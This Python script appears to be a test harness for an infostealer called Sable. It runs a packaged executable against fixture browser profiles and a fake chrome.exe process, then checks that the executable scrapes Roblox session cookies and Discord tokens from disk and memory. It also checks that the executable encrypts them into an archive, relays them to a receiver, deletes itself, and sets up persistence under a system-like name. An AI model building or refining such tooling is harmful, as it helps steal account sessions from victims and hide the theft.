"""Prove the Roblox collector through the packaged artifact, isolated from this desktop.

The guest run is the stronger evidence, but it needs the laptop and the laptop goes to
sleep. This drives the same artifact with ``LOCALAPPDATA``, ``APPDATA`` and
``USERPROFILE`` pointed at a scratch tree, so the browser collectors see a fixture and
nothing else. That is the isolation the VM was providing; what it does not provide is a
different machine, which is why it is a fallback and not a replacement.

    python local_roblox_run.py store
    python local_roblox_run.py memory

``store`` seals a ``.ROBLOSECURITY`` row into the fixture profile. ``memory`` leaves the
profile empty and runs a process named ``chrome.exe`` holding a different token, which is
the only way to make the RAM half answer.
"""

from __future__ import annotations

import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import time
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent / "sable"))

import sable_fixture as fixture  # noqa: E402

LIVE = HERE / "_out" / "live"
RECV = HERE / "_out" / "live_recv"
AES = HERE.parent / "sable" / "native" / "aes" / "target" / "release" / "sable-aes.exe"
KEY = "bench-laptop-v1"
SEED = LIVE / "guest-py.zip"


def stage_fixture(root: Path, mode: str) -> Path:
    local = root / "local"
    local.mkdir(parents=True, exist_ok=True)
    profile = fixture.build(local / "Google" / "Chrome")
    # Planted in both modes: the Discord half of the archive must not depend on which
    # Roblox half this run is proving.
    fixture.discord_token(profile)
    if mode == "store":
        fixture.roblox_cookie(profile)
    return local


def stage_fake(root: Path) -> tuple[Path, subprocess.Popen[bytes]]:
    """An embedded interpreter named ``chrome.exe`` holding the memory token."""
    with zipfile.ZipFile(SEED) as archive:
        archive.extractall(root / "fake")
    interpreter = root / "fake" / "py" / "python.exe"
    chrome = interpreter.with_name("chrome.exe")
    shutil.copy2(interpreter, chrome)
    holder = root / "fake" / "hold.py"
    holder.write_text(
        "import time\n"
        f"TOKEN = {fixture.MEMORY_TOKEN!r}\n"
        "time.sleep(900)\n",
        encoding="utf-8",
    )
    child = subprocess.Popen(
        [str(chrome), str(holder)],
        cwd=str(chrome.parent),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(3)
    if child.poll() is not None:
        raise SystemExit("fake chrome died before the run")
    return chrome, child


def archive_state() -> dict[str, tuple[int, float]]:
    """Size and mtime per archive. The receiver reuses one filename, so a name-only
    comparison sees the previous delivery and waits out the whole timeout."""
    return {
        path.name: (path.stat().st_size, path.stat().st_mtime)
        for path in RECV.glob("*.zip")
    }


def wait_for_archive(before: dict[str, tuple[int, float]], deadline: float) -> Path | None:
    while time.monotonic() < deadline:
        current = archive_state()
        fresh = [name for name, meta in current.items() if before.get(name) != meta]
        if fresh:
            newest = max((RECV / name for name in fresh), key=lambda p: p.stat().st_mtime)
            # A multipart body can appear before it is complete; size stable for a
            # second is the cheap test that the writer is done.
            size = newest.stat().st_size
            time.sleep(1.0)
            if newest.stat().st_size == size and size > 0:
                return newest
        time.sleep(1.0)
    return None


def open_archive(archive: Path, into: Path) -> bool:
    if into.exists():
        shutil.rmtree(into)
    result = subprocess.run(
        [str(AES), "open", str(archive), str(into), KEY],
        capture_output=True,
        text=True,
    )
    print(f"      sable-aes: {result.stdout.strip() or result.stderr.strip()}")
    return (into / "roblox_session.txt").is_file()


def main() -> int:
    mode = (sys.argv[1] if len(sys.argv) > 1 else "store").lower()
    if mode not in ("store", "memory"):
        raise SystemExit("mode must be store or memory")

    work = HERE / "_out" / "local-roblox" / mode
    if work.exists():
        shutil.rmtree(work)
    work.mkdir(parents=True)

    local = stage_fixture(work, mode)
    print(f"mode       {mode}")
    print(f"fixture    {local}")

    fake = None
    if mode == "memory":
        chrome, fake = stage_fake(work)
        print(f"fake       {chrome}  pid {fake.pid}")

    artifact = work / "SableRuntime.exe"
    shutil.copy2(LIVE / "SableRuntime.exe", artifact)

    env = dict(os.environ)
    env["LOCALAPPDATA"] = str(local)
    env["APPDATA"] = str(work / "roaming")
    env["USERPROFILE"] = str(work / "home")
    for key in ("APPDATA", "USERPROFILE"):
        Path(env[key]).mkdir(parents=True, exist_ok=True)
    # The desktop shell carries proxy variables. Inherited by the artifact they route its
    # relay POST through a gateway that answers 502, which reads exactly like a delivery
    # failure that is not one.
    for name in ("ALL_PROXY", "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
                 "all_proxy", "http_proxy", "https_proxy", "no_proxy"):
        env.pop(name, None)

    before = archive_state()
    started = time.monotonic()
    child = subprocess.Popen(
        [str(artifact)],
        cwd=str(work),
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print(f"artifact   {artifact.name}  pid {child.pid}")

    try:
        archive = wait_for_archive(before, time.monotonic() + 240)
        if archive is None:
            print("FAIL  no archive arrived")
            return 1
        elapsed = round(time.monotonic() - started, 1)
        print(f"archive    {archive.name}  {archive.stat().st_size:,} bytes  after {elapsed} s")

        opened = work / "opened"
        if not open_archive(archive, opened):
            print("FAIL  no roblox_session.txt in the archive")
            return 1

        lines = (opened / "roblox_session.txt").read_text(encoding="utf-8").splitlines()
        expected = fixture.STORE_TOKEN if mode == "store" else fixture.MEMORY_TOKEN
        other = fixture.MEMORY_TOKEN if mode == "store" else fixture.STORE_TOKEN
        exact = expected in lines
        strangers = [value for value in lines if value not in (expected, other)]
        if mode == "store":
            # The store half reads a redirected LOCALAPPDATA, so the fixture is the only
            # profile in scope and one line is the whole expectation.
            exact = exact and len(lines) == 1
        print(f"{'PASS' if exact else 'FAIL'}  roblox_session.txt  lines={len(lines)} "
              f"len={len(lines[0]) if lines else 0} planted={exact}")
        if strangers:
            # The memory half scans live chrome.exe processes, so a browser that is logged
            # into Roblox on this desktop answers too. Counted, never printed: they are the
            # operator's own sessions and the guest VM is where the single-candidate
            # control lives.
            print(f"      {len(strangers)} other value(s) from live browser sessions, "
                  f"lengths {sorted({len(v) for v in strangers})} — not printed")
        print(f"      matches the other mode's token: {bool(lines) and lines[0] == other}")

        status = opened / "roblox_status.json"
        if status.is_file():
            print("      " + " ".join(status.read_text(encoding="utf-8").split())[:400])

        discord = opened / "discord_session.txt"
        tokens = discord.read_text(encoding="utf-8").split() if discord.is_file() else []
        discord_ok = fixture.DISCORD_TOKEN in tokens
        print(f"{'PASS' if discord_ok else 'FAIL'}  discord_session.txt  lines={len(tokens)} "
              f"len={[len(v) for v in tokens]} exact={discord_ok}")

        # The artifact removes itself after the run and the removal is a detached cmd
        # that waits for the image to unlock. Killing it the moment the archive lands
        # would cut that short and read as a cleanup failure that is not one, and so
        # would reading the directory the instant the parent exits.
        try:
            child.wait(timeout=120)
        except subprocess.TimeoutExpired:
            print("      artifact did not exit within 120 s")
            return 1
        time.sleep(20)
        leftover = artifact.parent / (artifact.name + ".old")
        print(f"      exit     {child.returncode}  "
              f"exe_after={artifact.exists()}  exe_old={leftover.exists()}  "
              f"queue={(local / 'DeliveryQueue').exists()}  "
              f"persist={(local / 'Programs' / 'WinSvcHost').exists()}")
        return 0 if exact and discord_ok else 1
    finally:
        if child.poll() is None:
            child.terminate()
        if fake is not None:
            try:
                fake.kill()
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
